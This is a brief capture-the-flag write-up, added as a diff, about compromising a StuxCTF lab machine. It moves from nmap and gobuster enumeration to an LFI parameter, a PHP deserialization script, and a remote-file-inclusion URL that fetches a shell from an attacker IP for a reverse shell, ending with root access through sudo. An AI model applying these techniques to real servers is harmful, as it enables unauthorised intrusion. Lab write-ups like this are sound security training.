@@ -1,0 +1,6 @@
+Started with a nmap scan
+```
+22 OpenSSH 7.2p2
+80 Apache 2.4.18
+```
+I did a basic nmap scan for the http server and found a `robots.txt` file with one disallowed entry `/StuxCTF/` so lets start a gobuster on this folder but did not find anything going back to the main page if you look at the source there is some strings that go to a hidden folder after using chat GPT to help me with the math problem and got the hidden folder when you go to the folder and look at the source of the page there is a hint `/?file=` and doing a ffuf can for parameters `file` was the only one so when testing for LFI I did find if we just input `index.php` we get a hash and on anything else we get file does not exist so decoding the hash it was in hex and then had to reverse the text and base64 decode it agin then got the source code to the index.php file and looking at it we need to serialized the php object had chatGPT help me with a  script and now we have to download it to the webserver `/?file=http://10.13.8.255/shell.txt` and then we need to run the file  so just `/shell.php` and now we have a connection back and now if we do `sudo -l` we can run anything on as root 
